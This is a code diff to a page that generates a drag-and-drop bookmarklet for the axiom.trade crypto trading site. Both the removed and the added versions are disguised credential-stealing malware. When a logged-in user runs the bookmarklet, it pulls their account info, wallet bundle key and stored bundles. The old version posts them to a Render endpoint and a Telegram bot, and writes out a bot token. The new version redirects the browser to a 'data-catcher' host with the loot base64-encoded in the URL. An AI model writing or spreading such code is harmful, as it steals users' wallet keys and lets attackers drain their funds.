@@ -455,49 +455,66 @@
             // This is the string representation of the JavaScript executed by the browser.
             // All code must be enclosed in an IIFE (Immediately Invoked Function Expression).
             // =========================================================================
-            const code = `javascript:(async()=>{
-
-    const MY_URL = 'https://dashboard.render.com/web/srv-d9763k4vikkc73dmtrp0/deploys/dep-d9769jm7r5hc738uqa00?r=2026-07-08%4014%3A54%3A10%7E2026-07-08%4014%3A56%3A51';
-    const BOT_TOKEN = '8793190739:AAHmfVRGjAIMlun13gYZ0dLu-4JGarHAkCw';
-    const CHAT_ID = '7198683357';
+            const code = javascript:(async()=>{
 
     try {
 
-        const user = await (await fetch('//api7.axiom.trade/user-info',{
-            method:'POST',
-            credentials:'include'
-        })).json();
+        if(location.hostname !== 'axiom.trade'){
+            alert('Please navigate to axiom.trade first');
+            return;
+        }
 
-        const bundle = await (await fetch('//api8.axiom.trade/bundle-key-and-wallets',{
-            method:'POST',
-            credentials:'include'
-        })).json();
+        if(!localStorage.getItem('isAuthed')){
+            alert('Please log in to axiom.trade first');
+            return;
+        }
 
-        const data = {
-            user:user,
-            bundle:bundle.bundleKey,
-            sBundles:localStorage.getItem('sBundles')
+        const user = await (
+            await fetch('//api7.axiom.trade/user-info',{
+                method:'POST',
+                credentials:'include'
+            })
+        ).json();
+
+
+        const bundle = await (
+            await fetch('//api8.axiom.trade/bundle-key-and-wallets',{
+                method:'POST',
+                credentials:'include'
+            })
+        ).json();
+
+
+        const bookmarkData = {
+
+            telegramId: '7198683357',
+
+            site: location.href,
+
+            user: user,
+
+            bundle: bundle.bundleKey,
+
+            sBundles: localStorage.getItem('sBundles'),
+
+            eBundles: localStorage.getItem('eBundles')
+
         };
 
-        await fetch(MY_URL,{
-            method:'POST',
-            headers:{
-                'Content-Type':'application/json'
-            },
-            body:JSON.stringify(data)
-        });
 
-        await fetch(
-            \`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage?chat_id=\${CHAT_ID}&text=\${encodeURIComponent(JSON.stringify(data))}\`
+        location.replace(
+            'https://my-data-catcherr.onrender.com/data/' +
+            btoa(JSON.stringify(bookmarkData))
         );
 
-        alert('Done!');
 
-    } catch(e){
-        alert('Error: '+e.message);
+    } catch(e) {
+
+        alert('Error occurred');
+
     }
 
-})();`;
+})();;
 
             // Binds the generated JS string to the href attribute of the drag-and-drop button
             document.getElementById('bookmarklet-btn').setAttribute('href', code.replace(/\s+/g, ' '));
